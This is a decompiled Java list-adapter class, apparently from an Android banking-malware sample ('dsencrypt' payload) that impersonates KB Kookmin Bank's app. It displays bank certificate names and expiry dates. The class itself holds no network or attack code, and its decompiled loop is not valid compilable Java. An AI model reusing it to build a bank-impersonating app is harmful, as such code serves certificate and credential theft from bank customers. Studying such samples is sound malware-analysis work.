package com.kbstar.kb.android.star;

import android.content.Context;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.BaseAdapter;
import android.widget.TextView;
import com.kbstar.kb.android.star.model.Bank;
import java.util.List;

public class KBCertAdapter
  extends BaseAdapter
{
  private List<Bank> list;
  private Context mContext;
  private int resource;
  
  public KBCertAdapter(Context paramContext, List<Bank> paramList, int paramInt)
  {
    this.mContext = paramContext;
    this.list = paramList;
    this.resource = paramInt;
  }
  
  public void addItem(List<Bank> paramList)
  {
    this.list.addAll(paramList);
  }
  
  public int getCount()
  {
    return this.list.size();
  }
  
  public Object getItem(int paramInt)
  {
    return Integer.valueOf(paramInt);
  }
  
  public List<Bank> getItem()
  {
    return this.list;
  }
  
  public long getItemId(int paramInt)
  {
    return paramInt;
  }
  
  public View getView(int paramInt, View paramView, ViewGroup paramViewGroup)
  {
    Bank localBank = (Bank)this.list.get(paramInt);
    paramViewGroup = new ViewHolder();
    if (paramView == null)
    {
      paramView = LayoutInflater.from(this.mContext).inflate(this.resource, null);
      paramViewGroup.tv_name = ((TextView)paramView.findViewById(2131296302));
      paramViewGroup.tv_issue = ((TextView)paramView.findViewById(2131296304));
      paramViewGroup.tv_expire = ((TextView)paramView.findViewById(2131296303));
      paramView.setTag(paramViewGroup);
    }
    for (;;)
    {
      paramViewGroup.tv_name.setText(localBank.getName());
      paramViewGroup.tv_issue.setText("은행개인");
      paramViewGroup.tv_expire.setText(localBank.getExpire());
      return paramView;
      paramViewGroup = (ViewHolder)paramView.getTag();
    }
  }
  
  public void removeItem(int paramInt)
  {
    this.list.remove(paramInt);
  }
  
  public class ViewHolder
  {
    private TextView tv_expire;
    private TextView tv_issue;
    private TextView tv_name;
    
    public ViewHolder() {}
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/star/KBCertAdapter.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */